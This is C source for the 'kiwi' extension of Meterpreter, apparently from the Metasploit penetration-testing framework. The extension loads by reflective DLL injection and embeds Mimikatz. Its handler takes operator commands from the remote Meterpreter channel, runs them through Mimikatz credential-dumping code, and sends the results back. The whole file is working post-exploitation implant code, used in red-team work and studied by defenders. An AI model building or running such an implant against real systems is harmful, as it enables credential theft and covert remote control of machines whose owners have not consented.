/*!
 * @file main.c
 * @brief Entry point for the kiwi extension.
 */

#include "common.h" 
#include "common_metapi.h" 

// Required so that use of the API works.
MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "main.h"

extern wchar_t * powershell_reflective_mimikatz(LPWSTR input);
extern DWORD kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize);
extern LONG mimikatz_initOrClean(BOOL Init);

DWORD request_exec_cmd(Remote *remote, Packet *packet);
//DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_KIWI_EXEC_CMD, request_exec_cmd),
	COMMAND_TERMINATOR
};

/*!
 * @brief Handler for the generic command execution function.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_exec_cmd(Remote *remote, Packet *packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet * response = met_api->packet.create_response(packet);

	wchar_t* cmd = met_api->packet.get_tlv_value_wstring(packet, TLV_TYPE_KIWI_CMD);
	if (cmd != NULL)
	{
		dprintf("[KIWI] Executing command: %S", cmd);

		// While this implies that powershell is in use, this is just a naming thing,
		// it's not actually using powershell.
		wchar_t* output = powershell_reflective_mimikatz(cmd);
		dprintf("[KIWI] Executed command: %S", cmd);
		if (output != NULL)
		{
			met_api->packet.add_tlv_wstring(response, TLV_TYPE_KIWI_CMD_RESULT, output);
		}
		else
		{
			result = ERROR_OUTOFMEMORY;
		}
		//LocalFree(cmd);
	}
	else
	{
		result = ERROR_INVALID_PARAMETER;
	}

	dprintf("[KIWI] Dumped, transmitting response.");
	met_api->packet.transmit_response(result, remote, response);
	dprintf("[KIWI] Done.");

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;
	SET_LOGGING_CONTEXT(api)

	dprintf("[KIWI] Init server extension - initorclean");
	mimikatz_initOrClean(TRUE);

	dprintf("[KIWI] Init server extension - register");
	met_api->command.register_all(customCommands);

	dprintf("[KIWI] Init server extension - done");

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	mimikatz_initOrClean(FALSE);
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
